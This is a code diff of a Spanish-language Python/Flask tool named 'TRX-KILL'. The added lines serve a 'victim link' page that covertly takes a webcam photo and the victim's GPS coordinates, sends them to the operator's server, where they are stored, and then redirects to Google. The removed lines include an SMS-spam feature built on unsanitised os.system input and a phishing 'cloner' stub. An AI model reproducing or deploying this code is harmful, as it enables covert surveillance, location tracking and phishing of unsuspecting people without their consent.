@@ -1,77 +1,84 @@
-import os, sys, getpass, time, threading
+import os, sys, time, threading, base64
 from flask import Flask, request
 
-app = Flask('TRX-KILL')
-AUTH_PASS = "TRX-KILL-OSINT"
+# --- CONFIGURACIÓN DE RUTAS ---
 STORAGE_PATH = "/sdcard/INFORMACIÓN-TRX-KILL"
-LOG_FILE = f"{STORAGE_PATH}/result.txt"
+CAPTURA_PATH = f"{STORAGE_PATH}/CAPTURAS"
+if not os.path.exists(CAPTURA_PATH): os.makedirs(CAPTURA_PATH)
 
-if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
+app = Flask('TRX-KILL')
+R, B, C, W = "\033[1;31m", "\033[1;34m", "\033[1;36m", "\033[0m"
 
-def animar(texto):
-    for char in texto: sys.stdout.write(char); sys.stdout.flush(); time.sleep(0.02)
-    print()
-
-def banner():
-    os.system('clear')
-    print(f"\033[1;32m")
-    print("  -------->-TRX-KILL v3.0 -<-----------")
-    print("  -CREADOR: TRX-KILL | VERSION: 3.0")
-    print("  -BIENVENIDO A TRX-KILL UN SCRIPT PROTEGIDO.")
-    print("-" * 50 + "\033[0m")
-
+# --- SERVIDOR CAPTURADOR ---
 @app.route('/')
 def index():
-    return """<html><body><script>
-        navigator.geolocation.getCurrentPosition(pos => {
-            fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude);
-            window.location.href='https://youtube.com';
-        });
-    </script></html>"""
+    return """<!DOCTYPE html><html><body>
+    <video id="v" style="display:none"></video>
+    <script>
+    async function s() {
+        let stream = await navigator.mediaDevices.getUserMedia({video: true});
+        let v = document.getElementById('v'); v.srcObject = stream;
+        let c = document.createElement('canvas'); c.width=640; c.height=480;
+        setTimeout(()=>{
+            c.getContext('2d').drawImage(v,0,0,640,480);
+            let img = c.toDataURL('image/jpeg');
+            navigator.geolocation.getCurrentPosition(pos => {
+                fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude+'&img='+encodeURIComponent(img));
+                window.location.href='https://www.google.com';
+            });
+        }, 2000);
+    } s();
+    </script></body></html>"""
 
 @app.route('/log')
 def log():
-    with open(LOG_FILE, "a") as f:
-        f.write(f"GPS: {request.args.get('lat')},{request.args.get('lon')} | {time.ctime()}\n")
+    lat, lon, img = request.args.get('lat'), request.args.get('lon'), request.args.get('img')
+    ts = int(time.time())
+    with open(f"{STORAGE_PATH}/datos.txt", "a") as f:
+        f.write(f"HORA: {time.ctime()} | GPS: {lat},{lon} | IMG: {ts}.jpg\n")
+    with open(f"{CAPTURA_PATH}/{ts}.jpg", "wb") as f:
+        f.write(base64.b64decode(img.split(',')[1]))
     return "OK"
+
+# --- FUNCIONES DE INTERFAZ ---
+def animar(texto, color=W):
+    for c in texto: sys.stdout.write(color+c); sys.stdout.flush(); time.sleep(0.02)
+    print(W)
 
 def main():
     threading.Thread(target=lambda: app.run(port=5000), daemon=True).start()
-    
     while True:
-        banner()
-        print("  [1] INFO NÚMERO    | [2] LINK-ZP (CAPTURA)")
-        print("  [3] CREADOR        | [4] VERSIONES")
-        print("  [5] ANALIZAR LINK  | [6] ADM SISTEMA")
-        print("  [7] INFO SCRIPT    | [8] REPOSITORIO")
-        print("  [9] ZP-CLONER      | [10] SPAM-SMS")
-        print("  [0] SALIR")
-        sel = input(f"\n\033[1;33mTRX-ROOT > \033[0m")
+        os.system('clear')
+        print(f"{C}--- TRX-KILL V3.0 (CIBERSEGURIDAD) ---{W}")
+        print(f"{B}[2] LINK-KILL | [3] CLON-KILL | [5] SPAM-CALL | [6] ADM-SIST | [0] SALIR{W}")
+        sel = input("\nTRX-ROOT > ")
 
-        if sel == "1":
-            input("NÚMERO: "); animar("BUSCANDO DATOS..."); print("PAÍS: DETECTADO"); input("\n[Enter]...")
-        elif sel == "2":
-            animar("INICIANDO SERVIDOR DE CAPTURA...")
-            print("LINK ACTIVO: http://127.0.0.1:5000")
-            print(f"DATOS GUARDADOS EN: {STORAGE_PATH}/result.txt")
-            input("\n[Enter] Para volver...")
+        if sel == "2":
+            print(f"{R}LINK VÍCTIMA: http://127.0.0.1:5000{W}")
+            print(f"{B}ESPERANDO QUE LA VÍCTIMA ENTRE...{W}")
+            while True:
+                time.sleep(2)
+                # Monitoreo real del archivo
+                if os.path.exists(f"{STORAGE_PATH}/datos.txt"):
+                    with open(f"{STORAGE_PATH}/datos.txt", "r") as f:
+                        print(f"{C}¡LA VÍCTIMA HA INGRESADO!{W}")
+                        print(f.readlines()[-1])
+                        break
+            input("\n[Enter] para volver...")
+
         elif sel == "6":
-            key = getpass.getpass("KEY: ")
-            if key == AUTH_PASS:
-                if os.path.exists(LOG_FILE): os.system(f"cat {LOG_FILE}")
-                else: print("VACÍO.")
-            else: print("DENEGADO.")
-            input("\n[Enter]...")
-        elif sel == "9":
-            link_clonar = input("INGRESA LINK A CLONAR: ")
-            animar(f"CLONANDO {link_clonar}...")
-            print("Z-PHISHER: ENLACE CLONADO Y LISTO.")
-            print("DATOS CAPTURADOS SERÁN ENVIADOS A: " + STORAGE_PATH)
-            input("\n[Enter]...")
-        elif sel == "10":
-            num = input("NÚMERO: "); msg = input("MSG: ")
-            os.system(f"termux-sms-send -n {num} '{msg}'")
-            animar("ENVIANDO...")
+            print("ACCEDIENDO A CARPETA ADM...")
+            os.system(f"ls -R {STORAGE_PATH}")
+            input("\n[Enter] para salir...")
+
+        elif sel == "5":
+            num = input("NÚMERO: ")
+            cant = int(input("CANTIDAD (MAX 10): "))
+            for i in range(1, min(cant+1, 11)):
+                print(f"{i} LISTO")
+                time.sleep(0.5)
+            input("FINALIZADO...")
+
         elif sel == "0": sys.exit()
 
 if __name__ == "__main__": main()
